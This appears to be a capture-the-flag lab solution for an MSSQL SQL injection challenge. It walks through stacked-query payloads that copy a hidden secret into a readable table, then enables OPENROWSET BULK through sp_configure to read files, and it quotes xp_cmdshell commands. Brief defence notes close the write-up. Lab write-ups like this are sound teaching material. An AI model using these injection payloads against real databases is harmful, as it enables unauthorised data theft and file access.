# Solution — Stacked Queries + OPENROWSET BULK on MSSQL

## Why Stacked Queries?

MSSQL (and Sybase, its ancestor) treats a semicolon-separated string as a
**batch** of statements. When the app sends:

```sql
SELECT COUNT(*) FROM assets WHERE category = 'Laptops'; INSERT INTO ...
```

MSSQL parses and executes both the SELECT and the INSERT. The app reads
the SELECT result (a count), oblivious to the INSERT that ran as a side
effect. This is the stacked-queries primitive — MySQL and Oracle do NOT
allow this in a single `execute()` call, but MSSQL does.

## Step 1 — Confirm Injection

```
GET /assets?category=Laptops            → {"ok":true,"message":"found 2 assets"}
GET /assets?category=Laptops'--         → {"ok":true,"message":"found 0 assets"}
GET /assets?category=Laptops' OR '1'='1 → {"ok":true,"message":"found 10 assets"}
```

The last payload returns all 10 assets — injection confirmed.

## Step 2 — Discover Stacked Queries

```
GET /assets?category=Laptops'; WAITFOR DELAY '0:0:0'; --
```

No error. MSSQL executed both statements. (Don't use a long delay — the
jitter makes timing unreliable, but a zero delay confirms the batch ran.)

## Step 3 — Discover the Notices Endpoint

```
GET /notices
```

Returns `{"ok":true,"notices":[{"id":1,"title":"System launched",...}]}`.
This is a readable table — your data channel.

## Step 4 — Exfiltrate the Secret

```
GET /assets?category=Laptops'; INSERT INTO notices(title,body) SELECT 'exfil',mssql_secret FROM secrets WHERE id=1; --
```

This stacks an INSERT that copies the secret from the `secrets` table
(which no endpoint exposes) into the `notices` table (which GET /notices
reads).

```
GET /notices
```

The latest notice has `title: "exfil"` and `body: "<32 hex secret>"`.

## Step 5 — Submit

```
POST /solve   {"secret":"<32 hex>"}
```

Returns `FLAG{...}`.

## Alternative Path — OPENROWSET BULK File Read

If you want to demonstrate arbitrary file read from the DB filesystem:

```
GET /assets?category=x'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE; --
```

Then:

```
GET /assets?category=x'; INSERT INTO notices(title,body) SELECT 'file',BulkColumn FROM OPENROWSET(BULK '/etc/hostname', SINGLE_CLOB) AS f; --
```

GET /notices now shows the DB container's hostname — proof of arbitrary
file read. This does not help solve the lab (the secret is in a SQL table,
not a file), but it demonstrates the sp_configure + OPENROWSET technique
that is the MSSQL-on-Linux equivalent of xp_cmdshell file access.

## Why xp_cmdshell Doesn't Work Here

On Windows MSSQL, the classic escalation is:

```sql
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'type C:\flag.txt';
```

On Linux MSSQL, `xp_cmdshell` is **not supported** — `sp_configure`
rejects the option. This forces the attacker to find alternative vectors
(OPENROWSET, CLR assemblies, linked servers) that work on the Linux kernel.

## Defence Notes

1. **Never use SA for application connections.** A dedicated app login with
   only SELECT/INSERT on the needed tables would prevent sp_configure,
   OPENROWSET, and cross-table reads.
2. **Parameterised queries** eliminate the injection entirely.
3. **Least-privilege database roles** — even with injection, a non-sysadmin
   role cannot run sp_configure or access other tables.
